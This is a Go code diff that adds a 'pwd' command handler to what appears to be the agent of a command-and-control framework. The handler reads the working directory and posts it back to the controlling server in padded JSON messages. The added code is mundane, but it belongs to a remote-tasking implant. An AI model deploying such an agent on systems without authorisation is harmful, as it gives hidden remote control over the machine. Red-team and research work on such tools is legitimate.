@@ -1023,10 +1023,46 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 							resp2.StatusCode))
 					}
 				}
-			}
-		default:
-			if a.Verbose {
-				message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
+			case "pwd":
+				var se string
+				dir, err := os.Getwd()
+				if err != nil {
+					se = err.Error()
+				}
+
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stdout: dir,
+					Stderr: se,
+				}
+
+				k, err := json.Marshal(c)
+				if err != nil {
+					panic(err)
+				}
+
+				g := messages.Base{
+					Version: 1.0,
+					ID:      j.ID,
+					Type:    "CmdResults",
+					Payload: (*json.RawMessage)(&k),
+					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+				}
+				b2 := new(bytes.Buffer)
+				json.NewEncoder(b2).Encode(g)
+				if a.Verbose {
+					message("note", fmt.Sprintf("Sending response to server: %s", dir))
+				}
+				resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
+				if resp2.StatusCode != 200 {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
+					}
+				}
+			default:
+				if a.Verbose {
+					message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
+				}
 			}
 		}
 	}
